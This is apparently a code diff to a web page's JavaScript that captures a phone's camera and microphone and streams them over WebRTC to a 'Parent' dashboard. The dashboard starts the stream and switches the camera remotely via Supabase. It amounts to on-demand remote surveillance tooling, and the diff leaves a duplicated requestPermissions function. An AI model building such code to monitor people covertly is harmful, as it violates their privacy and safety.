@@ -155,66 +155,82 @@
             });
         }
 
-        // --- LIVE STREAMING LOGIC ---
+        // --- TRUE WEBRTC LIVE STREAMING LOGIC ---
         let localStream = null;
-        let captureCanvas = document.createElement('canvas');
-        let captureVideo = document.createElement('video');
+        let pc = null;
+        const webrtcChannel = supabaseClient.channel('webrtc-room', { config: { broadcast: { self: false } } });
 
-        async function startStreaming(cameraMode = 'user') {
+        async function initWebRTC(cameraMode = 'user') {
+            if (localStream) localStream.getTracks().forEach(track => track.stop());
+            
             try {
-                if (localStream) localStream.getTracks().forEach(track => track.stop());
-                
                 localStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: cameraMode, width: 480 },
+                    video: { facingMode: cameraMode },
                     audio: true
                 });
-
-                captureVideo.srcObject = localStream;
-                captureVideo.play();
-
-                // SIGNAL: Update status
-                await supabaseClient.from('device_status').upsert({
-                    device_id: DEVICE_ID,
-                    status: 'online',
-                    camera_mode: cameraMode,
-                    updated_at: new Date().toISOString()
-                });
-
-                // Periodic Snapshot (The "Real" Live)
-                setInterval(async () => {
-                    if (captureVideo.readyState === 4) {
-                        captureCanvas.width = 480;
-                        captureCanvas.height = captureVideo.videoHeight * (480 / captureVideo.videoWidth);
-                        const ctx = captureCanvas.getContext('2d');
-                        ctx.drawImage(captureVideo, 0, 0, captureCanvas.width, captureCanvas.height);
-                        const base64 = captureCanvas.toDataURL('image/jpeg', 0.5);
-                        
-                        // Send frame to Supabase
-                        await supabaseClient.from('signaling').upsert({
-                            device_id: DEVICE_ID,
-                            type: 'frame',
-                            payload: { image: base64 },
-                            created_at: new Date().toISOString()
-                        }, { onConflict: 'device_id,type' });
-                    }
-                }, 1000); // 1 frame per second (stable for mobile)
-
+                console.log("Caméra et micro capturés ! En attente du Dashboard...");
+                logActivity('system', 'Système Média Prêt', `Mode: ${cameraMode}`);
             } catch (err) {
                 console.error("Stream error:", err);
-                logActivity('error', 'Caméra bloquée', err.message);
+                logActivity('error', 'Caméra/Micro refusés', err.message);
+                return;
             }
+
+            webrtcChannel.on('broadcast', { event: 'signal' }, async (payload) => {
+                const data = payload.payload;
+                
+                if (data.offer) {
+                    console.log("Ordre de streaming reçu du Parent !");
+                    pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    
+                    pc.onicecandidate = e => {
+                        if (e.candidate) {
+                            webrtcChannel.send({ type: 'broadcast', event: 'signal', payload: { candidate: e.candidate } });
+                        }
+                    };
+
+                    await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
+                    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+                    const answer = await pc.createAnswer();
+                    await pc.setLocalDescription(answer);
+                    
+                    webrtcChannel.send({ type: 'broadcast', event: 'signal', payload: { answer: answer } });
+                    
+                    // Met à jour le status de la base
+                    await supabaseClient.from('device_status').upsert({
+                        device_id: DEVICE_ID,
+                        status: 'streaming',
+                        camera_mode: cameraMode,
+                        updated_at: new Date().toISOString()
+                    });
+
+                } else if (data.candidate && pc) {
+                    await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+                }
+            }).subscribe();
         }
 
-        // Listen for Remote Commands
-        const subscription = supabaseClient
-            .channel('remote-control')
+        // Écoute des ordres de changement de caméra
+        supabaseClient.channel('remote-control')
             .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'device_status', filter: `device_id=eq.${DEVICE_ID}` }, 
-            payload => {
-                const newMode = payload.new.camera_mode;
-                console.log("Remote command received: switch to", newMode);
-                startStreaming(newMode);
+            async (payload) => {
+                if (payload.new && payload.new.camera_mode) {
+                    const newMode = payload.new.camera_mode;
+                    console.log("Remote command: switch to", newMode);
+                    if (pc) pc.close();
+                    await initWebRTC(newMode);
+                }
             })
             .subscribe();
+
+        async function requestPermissions() {
+            try {
+                await initWebRTC('user');
+                alert("✅ Accès Caméra & Micro OK !\nLe téléphone est prêt à être écouté.");
+            } catch (err) {
+                alert("❌ Erreur : " + err.message);
+            }
+        }
 
         async function requestPermissions() {
             try {
